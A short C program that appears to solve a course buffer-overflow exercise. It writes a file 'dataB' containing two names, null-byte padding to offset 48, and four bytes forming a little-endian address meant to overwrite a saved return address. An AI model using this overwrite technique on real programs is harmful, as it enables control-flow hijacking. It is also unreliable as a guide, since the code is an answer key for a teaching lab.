#include <stdio.h>
#include <string.h>

int main (void) {
    FILE *psFile;
    char* partners = "Connor & Laura";
    int i;

    psFile = fopen("dataB", "w");

    fprintf(psFile, "%s", partners);

    for (i = 14; i < 48; i++) {
        fprintf(psFile, "%c", '\0');
    }

    fprintf(psFile, "%c", 0x90);
    fprintf(psFile, "%c", 0x08);
    fprintf(psFile, "%c", 0x40);
    fprintf(psFile, "%c", 0x00);

    /* close the file */
    fclose(psFile);

    return 0;
}